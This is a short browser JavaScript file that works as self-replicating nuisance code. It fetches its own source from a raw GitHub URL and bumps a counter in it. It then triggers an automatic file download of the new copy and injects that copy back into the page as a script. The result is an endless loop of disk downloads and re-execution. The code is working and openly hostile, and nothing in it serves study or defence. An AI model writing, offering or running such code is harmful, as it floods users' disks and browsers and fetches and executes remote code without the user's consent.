// Scope insulation wrapper to make each generation independent
(async function lobotomyScope() {

    // Safely track the counter using a global window registry state
    window.lobotoCounterRegister = typeof window.lobotoCounterRegister !== 'undefined' ? window.lobotoCounterRegister : 0;
    const currentCounter = window.lobotoCounterRegister;
    const futureSelf = currentCounter + 1;

    let source;

    // Check if a parent generation handed down the source text in memory
    if (window.lobotoSourceTextPayload) {
        source = window.lobotoSourceTextPayload;
    } else {
        try {
            // Using your exact required raw content URL mapping for the baseline boot
            const fetched = await fetch(`https://raw.githubusercontent.com/barrettma00-droid/fuckyou_0/refs/heads/main/fuckyou_0.js`);
            if (!fetched.ok) throw new Error("CORS or target file network mismatch.");
            source = await fetched.text();
        } catch (e) {
            console.error("Could not fetch base script content:", e);
            return;
        }
    }

    // Perform the precise string token manipulation for the subsequent generation download
    // DO NOT change this exact formatting; the regex engine relies on this pattern matching!
    const brainSynapses = source.replace(
        `let lobotoCounter = ${currentCounter};`,
        `let lobotoCounter = ${futureSelf};`
    );

    // Formulate the official File object structure
    const file = new File([brainSynapses], `fuckyou_${futureSelf}.js`, {
        type: "text/javascript",
    });

    // Pass everything down the pipeline
    theSecondLobotomy(file, brainSynapses, futureSelf);

    async function theSecondLobotomy(capturedFile, mutatedText, nextId) {
        const capturedContent = await capturedFile.text();
        console.log(`Generated: ${capturedFile.name}`);
        console.log(capturedContent);

        // Execute physical disk download
        downloadFile(capturedFile);

        // Push payload to the browser memory execution environment
        theFinalLobotomy(mutatedText, nextId);
    }

    function downloadFile(download) {
        const url = URL.createObjectURL(download);
        const link = document.createElement("a");
        link.href = url;
        link.download = download.name;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    }

    async function theFinalLobotomy(string, nextId) {
        // Feed the updated source text and counter threshold straight into the global registries
        window.lobotoSourceTextPayload = string;
        window.lobotoCounterRegister = nextId;

        const blob = new Blob([string], { type: 'text/javascript'});
        const blobsPlace = URL.createObjectURL(blob);

        const theNeedle = document.createElement('script');
        theNeedle.src = blobsPlace;

        theNeedle.onload = () => {
            URL.revokeObjectURL(blobsPlace);
        };

        document.head.appendChild(theNeedle);
    }

})();

